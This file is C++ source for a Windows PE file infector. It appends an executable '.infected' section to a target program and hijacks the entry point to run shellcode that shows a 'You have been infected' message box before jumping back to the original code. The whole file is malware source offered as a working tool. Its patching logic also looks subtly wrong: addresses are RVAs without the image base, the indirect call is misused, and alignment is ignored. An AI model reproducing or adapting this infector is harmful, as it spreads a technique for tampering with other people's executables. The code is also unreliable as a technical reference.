#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <iostream>

#define INFECTED_SECTION ".infected"

// The new shellcode; the layout is as follows:
//  0x6A, 0x00               -> push 0              ; for MB_OK
//  0x68, <4-byte>           -> push caption address (to be patched)
//  0x68, <4-byte>           -> push text address    (to be patched)
//  0x6A, 0x00               -> push 0              ; hWnd = NULL
//  0xFF, 0x15, <4-byte>      -> call MessageBoxA    (address to be patched)
//  0xE9, <4-byte>           -> jmp original entry point (computed at runtime)
//  Data section appended:
//      "You have been infected\0"  (text)
//      "Infected\0"                (caption)
BYTE shellcode[] = {
    0x6A, 0x00,                         // push 0 (MB_OK)
    0x68, 0x00,0x00,0x00,0x00,            // push caption address (placeholder)
    0x68, 0x00,0x00,0x00,0x00,            // push text address (placeholder)
    0x6A, 0x00,                         // push 0 (hWnd)
    0xFF, 0x15, 0x00,0x00,0x00,0x00,       // call MessageBoxA (placeholder address)
    0xE9, 0x00,0x00,0x00,0x00,             // jmp original entry point (placeholder)
    // Data: text string then caption string.
    'Y','o','u',' ','h','a','v','e',' ','b','e','e','n',' ','i','n','f','e','c','t','e','d',0x00,
    'I','n','f','e','c','t','e','d',0x00
};

#define SHELLCODE_SIZE (sizeof(shellcode))

void InjectCodeIntoPE(const char* targetFile) {
    wchar_t wTargetFile[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, targetFile, -1, wTargetFile, MAX_PATH);
    HANDLE hFile = CreateFile(wTargetFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Cannot open file %s\n", targetFile);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));

    // Add a new section for the shellcode at the end of the PE file
    IMAGE_SECTION_HEADER* newSection = &sectionHeaders[ntHeaders->FileHeader.NumberOfSections];
    memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER));
    memcpy(newSection->Name, INFECTED_SECTION, strlen(INFECTED_SECTION));

    newSection->Misc.VirtualSize = SHELLCODE_SIZE;
    newSection->SizeOfRawData = SHELLCODE_SIZE;
    newSection->PointerToRawData = fileSize;  // Append to the end of the file
    newSection->VirtualAddress = sectionHeaders[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress +
                                  sectionHeaders[ntHeaders->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
    newSection->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    ntHeaders->OptionalHeader.SizeOfImage += SHELLCODE_SIZE;
    ntHeaders->FileHeader.NumberOfSections++;

    // Save the original EntryPoint
    DWORD oep = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    // Update the entry point to point to our shellcode
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;

    // Patch the shellcode placeholders.
    // Calculate base address of shellcode when loaded in memory.
    DWORD shellcodeBase = newSection->VirtualAddress;
    // Offsets within shellcode:
    //   Caption address pushed at offset 3 (little-endian)
    //   Text address pushed at offset 8
    //   MessageBoxA address at offset 16
    //   Jump offset placeholder at offset 21

    // The data is placed immediately after the 25 bytes of instructions.
    const DWORD dataOffset = 25;
    // In the data section:
    //   Text string "You have been infected" starts at offset=dataOffset.
    //   Caption string "Infected" starts at offset = dataOffset + 23.
    const DWORD textAddr = shellcodeBase + dataOffset;
    const DWORD captionAddr = shellcodeBase + dataOffset + 23;

    // Patch caption pointer.
    *(DWORD*)(shellcode + 3) = captionAddr;
    // Patch text pointer.
    *(DWORD*)(shellcode + 8) = textAddr;
    // Patch MessageBoxA address.
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    DWORD msgBoxAddr = (DWORD)GetProcAddress(hUser32, "MessageBoxA");
    *(DWORD*)(shellcode + 16) = msgBoxAddr;
    // Patch jump offset: jump from current EIP (i.e. shellcodeBase + 20 + 5) to original entry point.
    // The jump instruction at offset 20 uses a relative offset starting from (shellcodeBase + 25)
    *(DWORD*)(shellcode + 21) = oep - (shellcodeBase + 25);

    // Write the modified headers back to the file.
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);

    // Write the shellcode in a single write at the end of the file.
    SetFilePointer(hFile, fileSize, NULL, FILE_BEGIN);
    WriteFile(hFile, shellcode, SHELLCODE_SIZE, &bytesWritten, NULL);

    CloseHandle(hFile);
    delete[] buffer;

    printf("Successfully injected shellcode into %s\n", targetFile);
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PE file>\n", argv[0]);
        return 1;
    }

    const char* infectedFile = argv[1];  // The target file to inject into
    InjectCodeIntoPE(infectedFile);  // Inject shellcode into the target file

    return 0;
}